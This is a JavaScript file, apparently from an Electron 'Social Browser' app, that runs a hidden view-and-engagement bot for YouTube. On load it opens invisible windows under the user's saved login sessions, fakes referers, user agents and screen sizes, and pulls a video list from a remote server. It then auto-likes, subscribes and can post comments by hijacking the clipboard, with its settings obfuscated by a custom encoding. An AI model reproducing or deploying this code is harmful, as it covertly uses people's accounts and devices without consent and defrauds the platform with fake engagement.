(function (w) {
  if (w.MYSERVERYOUTUBESCRIPT_LOADED) {
    console.log('MYSERVERYOUTUBESCRIPT Aborting 0 ...');
    return;
  }

  w.MYSERVERYOUTUBESCRIPT_LOADED = true;
  w.MYSERVERYOUTUBESCRIPT = true;

  SOCIALBROWSER.var.blocking.youtube.quality = {
    name: 'medium',
    value: '360',
  };
  SOCIALBROWSER.youtubeManager = {
    currentIndex: -1,
    sleep: 1000 * 60 * 5,
    visitOptions: {
      subscribe: false,
      like: false,
      comment: false,
      unlike: false,
      report: false,
      show: false,
      type: '',
      timeout: 1000 * 60 * 5,
      title: 'No Title',
      url: 'https://bit.ly/3aBjyoX',
      host: 'youtube',
      referer: 'dynamic',
      proxy: null,
      partition: null,
      scroll: false,
      count: 1,
    },
    trackingList: [],
    visitList: [
      { subscribe: true, like: true, title: 'mvc api fetch', url: 'https://bit.ly/3HCCZw3', timeout: 1000 * 60 * 15 },
      { subscribe: true, like: true, title: 'FrontEnd', url: 'https://bit.ly/3vwBBsv', timeout: 1000 * 60 * 35 },
      { subscribe: true, like: true, title: 'ازاى المواقع بتعرف انت مين', url: 'https://bit.ly/3aBjyoX', timeout: 1000 * 60 * 20 },
      { subscribe: true, like: true, title: 'متصفح لحماية الاطفال ومانع للاعلانات', url: 'https://bit.ly/3sqPXGv', timeout: 1000 * 60 * 20 },
      { subscribe: true, like: true, title: 'زيادة مشاهدات اليوتيوب addmefast', url: 'https://bit.ly/3nYMBqY', timeout: 1000 * 60 * 15 },
      { subscribe: true, like: true, title: 'scripts now - download', url: 'https://bit.ly/3qIL62c', timeout: 1000 * 60 * 2 },
      { subscribe: true, like: true, title: 'تحميل الافلام من المواقع بدون اعلانات', url: 'https://bit.ly/3FCa8Hr', timeout: 1000 * 60 * 3 },
      { subscribe: true, like: true, title: 'Cima4u - YouTube', url: 'https://bit.ly/3x7NRyi', timeout: 1000 * 60 * 10 },
      { subscribe: true, like: true, title: 'wintube com | sites scam on users', url: 'https://bit.ly/3oAQiDL', timeout: 1000 * 60 * 10 },
      { subscribe: true, like: true, title: 'nodejs chat', url: 'https://bit.ly/3w5T5JH', timeout: 1000 * 60 * 50 },
      { subscribe: true, like: true, title: 'MVC 5 Review', url: 'https://bit.ly/3wmkQhd', timeout: 1000 * 60 * 75 },
      { subscribe: true, like: true, title: 'c# Review', url: 'https://bit.ly/2SKI9CG', timeout: 1000 * 60 * 75 },
      { subscribe: true, like: true, title: 'c# winforms Review', url: 'https://bit.ly/3qpT015', timeout: 1000 * 60 * 75 },
      { subscribe: true, like: true, title: 'sharepoint admin 2016', url: 'https://bit.ly/34p86d9', timeout: 1000 * 60 * 65 },
    ],
    refererList: [
      'https://www.facebook.com/',
      'https://twitter.com/',
      'https://www.instagram.com/',
      'https://www.pinterest.com/',
      'https://www.reddit.com/',
      'https://www.tumblr.com/',
      'https://www.tiktok.com/',
      'https://flipboard.com/',
      'https://vk.com/',
      'https://getpocket.com/',
      'https://digg.com/video',
      'https://www.linkedin.com/',
      'https://qzone.qq.com/',
      'https://web.wechat.com/?lang=en',
      'https://web.whatsapp.com/',
    ],
    userAgentList: [
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' },
      { url: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.36 Mobile/15E148 Safari/604.1' },
      { url: 'Mozilla/5.0 (iPad; CPU OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.36 Mobile/15E148 Safari/604.1' },
      { url: 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.0; rv:94.0) Gecko/20100101 Firefox/94.0' },
      { url: 'Mozilla/5.0 (X11; Linux i686; rv:94.0) Gecko/20100101 Firefox/94.0' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/95.0.1020.53' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/81.0.4196.37' },
    ],
    scrrenSizeList: ['1920x1080', '1536x864', '1366x768', '1280x768', '1024x768', '1280x720'],
    screenIndex: -1,
    randomScreenSize: function () {
      if (SOCIALBROWSER.youtubeManager.scrrenSizeList.length > 0) {
        SOCIALBROWSER.youtubeManager.screenIndex++;
        if (SOCIALBROWSER.youtubeManager.scrrenSizeList.length <= SOCIALBROWSER.youtubeManager.screenIndex) {
          SOCIALBROWSER.youtubeManager.screenIndex = 0;
        }
        return SOCIALBROWSER.youtubeManager.scrrenSizeList[SOCIALBROWSER.youtubeManager.screenIndex];
      } else {
        return '1366x768';
      }
    },
    agentIndex: -1,
    randomUserAgent: function () {
      if (SOCIALBROWSER.youtubeManager.userAgentList.length > 0) {
        SOCIALBROWSER.youtubeManager.agentIndex++;
        if (SOCIALBROWSER.youtubeManager.userAgentList.length <= SOCIALBROWSER.youtubeManager.agentIndex) {
          SOCIALBROWSER.youtubeManager.agentIndex = 0;
        }
        return SOCIALBROWSER.youtubeManager.userAgentList[SOCIALBROWSER.youtubeManager.agentIndex];
      } else {
        return null;
      }
    },
    refererIndex: -1,
    randomReferer: function (video) {
      if (video.type == 'support') {
        return 'https://egytag.com/';
      }
      if (SOCIALBROWSER.youtubeManager.refererList.length > 0) {
        SOCIALBROWSER.youtubeManager.refererIndex++;
        if (SOCIALBROWSER.youtubeManager.refererList.length <= SOCIALBROWSER.youtubeManager.refererIndex) {
          SOCIALBROWSER.youtubeManager.refererIndex = 0;
        }
        return SOCIALBROWSER.youtubeManager.refererList[SOCIALBROWSER.youtubeManager.refererIndex];
      } else {
        return 'https://www.facebook.com/';
      }
    },
    userIndex: -1,
    randomPartition: function () {
      if (SOCIALBROWSER.var.session_list.length > 0) {
        SOCIALBROWSER.youtubeManager.userIndex++;
        if (SOCIALBROWSER.var.session_list.length <= SOCIALBROWSER.youtubeManager.userIndex) {
          SOCIALBROWSER.youtubeManager.userIndex = 0;
        }
        return SOCIALBROWSER.var.session_list[SOCIALBROWSER.youtubeManager.userIndex].name;
      } else {
        return 'ghost_' + Date.now();
      }
    },
    randomVisit: function () {
      if (SOCIALBROWSER.youtubeManager.visitList.length > 0) {
        SOCIALBROWSER.youtubeManager.currentIndex++;
        if (SOCIALBROWSER.youtubeManager.visitList.length <= SOCIALBROWSER.youtubeManager.currentIndex) {
          SOCIALBROWSER.youtubeManager.currentIndex = -1;
          SOCIALBROWSER.youtubeManager.prepareVisits();
          return null;
        }
        return SOCIALBROWSER.youtubeManager.visitList[SOCIALBROWSER.youtubeManager.currentIndex];
      } else {
        return null;
      }
    },
    prepareVisits: function () {
      SOCIALBROWSER.log('youtubeManager.prepareVisits()');
      SOCIALBROWSER.fetchJson(
        {
          url: SOCIALBROWSER.server_url + '/api/youtube_list',
          method: 'GET',
        },
        function (data) {
          if (data.done && data.list && data.list.length > 0) {
            if (data.reset) {
              SOCIALBROWSER.youtubeManager.trackingList = [];
            }
            SOCIALBROWSER.youtubeManager.visitList = [];
            data.list.forEach((v) => {
              SOCIALBROWSER.youtubeManager.visitList.push(v);
            });
          }
        }
      );
    },
  };

  SOCIALBROWSER.youtubeManager.createFakeVisitWindow = function (op) {
    let options = { ...SOCIALBROWSER.youtubeManager.visitOptions, ...op };
    let preload = SOCIALBROWSER.dir + '/browser_files/js/context-menu.js';

    let scrren_size = SOCIALBROWSER.youtubeManager.randomScreenSize().split('x');

    let win = new SOCIALBROWSER.remote.BrowserWindow({
      show: options.show,
      width: parseInt(scrren_size[0] || '1366'),
      height: parseInt(scrren_size[1] || '768'),
      skipTaskbar: true,
      webPreferences: {
        sandbox: false,
        contextIsolation: false,
        enableRemoteModule: true,
        nodeIntegrationInSubFrames: false,
        partition: options.partition || SOCIALBROWSER.youtubeManager.randomPartition(),
        webaudio: false,
        webSecurity: true,
        allowRunningInsecureContent: false,
        preload: preload,
      },
    });

    win.webContents.audioMuted = true;

    win.webContents.userAgent = options.userAgent || SOCIALBROWSER.youtubeManager.randomUserAgent().url;

    if (SOCIALBROWSER.var.core.id.like('*test*')) {
      win.setSkipTaskbar(false);
      win.showInactive();
      win.openDevTools();
      win.webContents.on('context-menu', (event, params) => {
        win.webContents.send('context-menu', params);
      });
    } else {
      if (options.show) {
        win.maximize();
      } else {
        win.hide();
      }
    }

    win.setMenuBarVisibility(false);
    if (options.proxy) {
      const ss = win.webContents.session;
      ss.setProxy(
        {
          proxyRules: options.proxy,
          proxyBypassRules: '127.0.0.1',
        },
        function () {}
      );
    }
    if (options.referer == 'dynamic') {
      options.referer = SOCIALBROWSER.youtubeManager.randomReferer(options);
    }
    let code_injected = `SOCIALBROWSER.fakeview123 = '${SOCIALBROWSER.to123(options)}';`;
    code_injected += `if (!window.SOCIALBROWSER) {
  window.SOCIALBROWSER = {
    var: {
      core: { id: '' },
      blocking: {
        javascript: {},
        popup: {},
        core: {},
        youtube: {},
      },
    },
    isIframe: () => {
      try {
        return window.self !== window.top;
      } catch (e) {
        return true;
      }
    },
  };
}
SOCIALBROWSER.url = SOCIALBROWSER.url || require('url');
SOCIALBROWSER.var.blocking.javascript.block_window_open = true;
SOCIALBROWSER.var.blocking.popup.allow_external = false;
SOCIALBROWSER.var.blocking.popup.allow_internal = false;
window.open = function (url) {
  console.log(' code0 [ window.open ] ' + url);
  if (!url || url == 'about:blank') {
    return;
  }
  setTimeout(function () {
    document.location.href = url;
  }, 3 * 1000);
};

localStorage.clear = () => {
  console.log('User Request Clear LocalStorage');
};

if (!SOCIALBROWSER.isIframe() && '${options.scroll}' == 'true') {
  function scrollRandom() {
    if (SOCIALBROWSER.scrollStop) {
      return;
    }

    let y = window.scrollY;
    y = y + (Math.floor(Math.random() * 150) + 50);
    if (document.body && window.innerHeight + window.scrollY >= document.body.offsetHeight) {
      y = 0;
      document.documentElement.scrollTop = 0;
    }
    window.scrollTo(0, y);

    setTimeout(() => {
      scrollRandom();
    }, 1000 * (Math.floor(Math.random() * 5) + 1));
  }

  setTimeout(() => {
    scrollRandom();
  }, 1000 * 20);
}

if (!SOCIALBROWSER.from123) {
  SOCIALBROWSER.$base64Letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
  SOCIALBROWSER.$base64Numbers = [];
  for (let $i = 11; $i < 99; $i++) {
    if ($i % 10 !== 0 && $i % 11 !== 0) {
      SOCIALBROWSER.$base64Numbers.push($i);
    }
  }

  SOCIALBROWSER.toJson = (obj) => {
    if (typeof obj === undefined || obj === null) {
      return '';
    }
    return JSON.stringify(obj);
  };

  SOCIALBROWSER.fromJson = (str) => {
    if (typeof str !== 'string') {
      return str;
    }
    return JSON.parse(str);
  };

  SOCIALBROWSER.toBase64 = (str) => {
    if (typeof str === undefined || str === null || str === '') {
      return '';
    }
    if (typeof str !== 'string') {
      str = SOCIALBROWSER.toJson(str);
    }
    return btoa(unescape(encodeURIComponent(str)));
  };

  SOCIALBROWSER.fromBase64 = (str) => {
    if (typeof str === undefined || str === null || str === '') {
      return '';
    }
    return decodeURIComponent(escape(atob(str)));
  };

  SOCIALBROWSER.to123 = (data) => {
    data = SOCIALBROWSER.toBase64(data);
    let newData = '';
    for (let i = 0; i < data.length; i++) {
      let letter = data[i];
      newData += SOCIALBROWSER.$base64Numbers[SOCIALBROWSER.$base64Letter.indexOf(letter)];
    }
    return newData;
  };

  SOCIALBROWSER.from123 = (data) => {
    let newData = '';
    for (let i = 0; i < data.length; i++) {
      let num = data[i] + data[i + 1];
      let index = SOCIALBROWSER.$base64Numbers.indexOf(parseInt(num));
      newData += SOCIALBROWSER.$base64Letter[index];
      i++;
    }
    newData = SOCIALBROWSER.fromBase64(newData);
    return newData;
  };

  SOCIALBROWSER.typeOf = SOCIALBROWSER.typeof = function type(elem) {
    return Object.prototype.toString.call(elem).slice(8, -1);
  };
}

if (SOCIALBROWSER.fakeview123) {
  SOCIALBROWSER.fakeview = JSON.parse(SOCIALBROWSER.from123(SOCIALBROWSER.fakeview123));
}

if (!SOCIALBROWSER.fakeview) {
  SOCIALBROWSER.fakeview = {
    url: 'http://social-browser.com/api/youtube_random_video',
    referer: { url: 'https://www.olx.com.eg/' },
    like: true,
    subscribe: true,
  };
}
` + `console.log(' [ YOUTUBE ] ');

if (SOCIALBROWSER && SOCIALBROWSER.var) {
  SOCIALBROWSER.var.blocking.core = SOCIALBROWSER.var.blocking.core || {};
  SOCIALBROWSER.var.blocking.core.skip_video_ads = false;
  SOCIALBROWSER.var.blocking.youtube = SOCIALBROWSER.var.blocking.youtube || {};
  SOCIALBROWSER.var.blocking.youtube.skip_ads = false;
}

window.open = function () {
  return {};
};

function __document__ready__() {
  if (document.location.host.indexOf('youtu') == -1) {
    let body = document.querySelector('body');
    if (body && !document.querySelector('#__a_injected')) {
      let a = document.createElement('a');
      a.href = SOCIALBROWSER.fakeview.url;
      a.id = '__a_injected';
      a.innerHTML = SOCIALBROWSER.fakeview.url;
      a.setAttribute('target', '_self');

      body.appendChild(a);
      a.style.backgroundColor = 'red';
      a.style.color = '#ffffff';
      a.style.fontSize = '22px';
      a.scrollIntoView();

      setTimeout(function () {
        document.querySelector('#__a_injected').click();
      }, 5 * 1000);
    }

    setTimeout(function () {
      document.location.href = SOCIALBROWSER.fakeview.url;
    }, 30 * 1000);
  } else {
    SOCIALBROWSER.YOUTUBE = {
      PLAYER: '#movie_player',
      SUBSCRIBE_BUTTON: '#subscribe-button > ytd-subscribe-button-renderer > tp-yt-paper-button',
      LIKE_BUTTON: 'ytd-video-primary-info-renderer #top-level-buttons-computed > ytd-toggle-button-renderer:nth-child(1)',
      DISLIKE_BUTTON: 'ytd-video-primary-info-renderer #top-level-buttons-computed > ytd-toggle-button-renderer:nth-child(2)',
      NOTIFICATION: 'ytd-popup-container',
      LIKE_BUTTON_CLICKED_CLASS: 'style-default-active',
      COMMENT_BOX: 'ytd-comment-simplebox-renderer #simplebox-placeholder',
      COMMENT_SUBMIT: '#buttons #submit-button',
      isUserLogin: function () {
        return document.querySelector('a[href^="https://accounts.google.com/ServiceLogin"]') ? false : true;
      },
      scrollDown: function () {
        let y = window.scrollY + 50;
        window.scrollTo(0, y);
      },
      scrollUp: function () {
        let y = window.scrollY - 50;
        window.scrollTo(0, y);
      },
      comment: function () {
        if ((box = document.querySelector(SOCIALBROWSER.YOUTUBE.COMMENT_BOX))) {
          box.scrollIntoView(false);
          box.click();
          let old_copy = SOCIALBROWSER.remote.clipboard.readText();
          SOCIALBROWSER.remote.clipboard.writeText('Good Videos');
          SOCIALBROWSER.webContents.paste();
          setTimeout(() => {
            if ((submit = document.querySelector(SOCIALBROWSER.YOUTUBE.COMMENT_SUBMIT))) {
              submit.scrollIntoView(false);
              submit.click();
            }
            SOCIALBROWSER.remote.clipboard.writeText(old_copy);
          }, 1000 * 5);
        } else {
          SOCIALBROWSER.YOUTUBE.scrollDown();
          setTimeout(() => {
            SOCIALBROWSER.YOUTUBE.comment();
          }, 1000);
        }
      },
      isSubscribed: function () {
        let subscribeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.SUBSCRIBE_BUTTON);
        if (!subscribeButton) {
          return false;
        }
        const subscribed = subscribeButton.hasAttribute('subscribed');
        return subscribed;
      },
      subscribe: function () {
        let subscribeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.SUBSCRIBE_BUTTON);
        if (!subscribeButton) {
          return false;
        }
        let subscribed = subscribeButton.hasAttribute('subscribed');
        if (subscribed) {
          return true;
        } else {
          subscribeButton.click();
          return true;
        }
      },
      like: function () {
        const likeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.LIKE_BUTTON);
        if (!likeButton) {
          return false;
        }
        if (likeButton.classList.contains(SOCIALBROWSER.YOUTUBE.LIKE_BUTTON_CLICKED_CLASS)) {
          return true;
        } else {
          likeButton.click();
          return true;
        }
      },
    };

    SOCIALBROWSER.var.blocking.core.skip_video_ads = false;
    SOCIALBROWSER.var.blocking.youtube.skip_ads = false;

    setInterval(() => {
      if (SOCIALBROWSER.YOUTUBE.isUserLogin()) {
        if (SOCIALBROWSER.fakeview.like) {
          SOCIALBROWSER.YOUTUBE.like();
        }
        if (SOCIALBROWSER.fakeview.subscribe) {
          SOCIALBROWSER.YOUTUBE.subscribe();
        }
      }
    }, 1000 * 60 * 3);

    setInterval(() => {
      if (SOCIALBROWSER.video_player) {
        SOCIALBROWSER.video_player.playVideo();
      }

      document.querySelectorAll('ytd-consent-bump-v2-lightbox a.yt-simple-endpoint.style-scope.yt-button-renderer').forEach((d, i) => {
        if (i == 0) {
          d.click();
        }
      });

      document.querySelectorAll('iron-overlay-backdrop').forEach((d) => d.remove());
      document.querySelectorAll('#dialog').forEach((d) => d.remove());

      if (document.location.href.indexOf('consent') !== -1) {
        let btn = document.querySelector('form input[type=submit]') || document.querySelector('form button');
        if (btn) {
          btn.click();
        }
      }
    }, 1000 * 5);

    if (SOCIALBROWSER && SOCIALBROWSER.setPlaybackQuality) {
      SOCIALBROWSER.var.blocking.youtube.quality = {
        name: 'medium',
        value: '360',
      };
      SOCIALBROWSER.setPlaybackQuality();
    }
  }
}

if (document.readyState !== 'loading') {
  __document__ready__();
} else {
  document.addEventListener('DOMContentLoaded', () => {
    __document__ready__();
  });
}
`;

    if (SOCIALBROWSER.var.core.version < '2021.03.01') {
      win.webContents.addListener('dom-ready', function (event) {
        win.webContents.executeJavaScript(code_injected);
      });
    } else {
      SOCIALBROWSER.call('[set][window][setting]', {
        win_id: win.id,
        name: 'youtube-view',
        options: options,
      });
      SOCIALBROWSER.call('[set][window][setting]', {
        win_id: win.id,
        name: 'eval',
        code: code_injected,
      });
    }

    win.loadURL(options.referer).catch((err) => {
      if (err.code === 'ERR_ABORTED') {
      }
    });

    win.on('close', function () {
      win.destroy();
    });

    win.on('closed', function () {
      setTimeout(() => {
        SOCIALBROWSER.youtubeManager.runFakeVisit();
      }, options.timeout);
    });

    win.webContents.on('did-fail-load', function (e) {
      if (e.isMainFrame) {
        win.destroy();
      }
    });

    win.webContents.session.on('will-download', (event, item, webContents) => {
      event.preventDefault();
    });
    win.webContents.session.setPermissionRequestHandler((webContents, permission, callback) => {
      callback(false);
    });
    win.webContents.session.setPermissionCheckHandler((webContents, permission) => {
      return false;
    });

    setTimeout(function () {
      if (win && !win.isDestroyed()) {
        win.destroy();
      }
    }, options.timeout);
  };
  SOCIALBROWSER.youtubeManager.Tracking = function (v) {
    let t = null;
    SOCIALBROWSER.youtubeManager.trackingList.forEach((track) => {
      if (track.url == v.url) {
        track.count++;
        t = track;
      }
    });
    if (!t) {
      t = {
        url: v.url,
        count: 1,
      };
      SOCIALBROWSER.youtubeManager.trackingList.push(t);
    }
    return t;
  };
  SOCIALBROWSER.youtubeManager.runFakeVisit = function () {
    setTimeout(() => {
      let v = SOCIALBROWSER.youtubeManager.randomVisit();
      if (v) {
        let track = SOCIALBROWSER.youtubeManager.Tracking(v);
        if (v.count && v.count < track.count) {
          SOCIALBROWSER.youtubeManager.runFakeVisit();
        } else {
          SOCIALBROWSER.youtubeManager.sleep = v.timeout;
          SOCIALBROWSER.youtubeManager.createFakeVisitWindow(v);
        }
      } else {
        SOCIALBROWSER.youtubeManager.runFakeVisit();
      }
    }, 1000 * 60);
  };

  SOCIALBROWSER.youtubeManager.prepareVisits();
  SOCIALBROWSER.youtubeManager.runFakeVisit();
  SOCIALBROWSER.youtubeManager.startTime = Date.now();
  setInterval(() => {
    if (Date.now() - SOCIALBROWSER.youtubeManager.startTime > 1000 * 60 * 60 * 24) {
      SOCIALBROWSER.youtubeManager.trackingList = [];
    }
  }, 1000 * 60 * 60);
})(window);
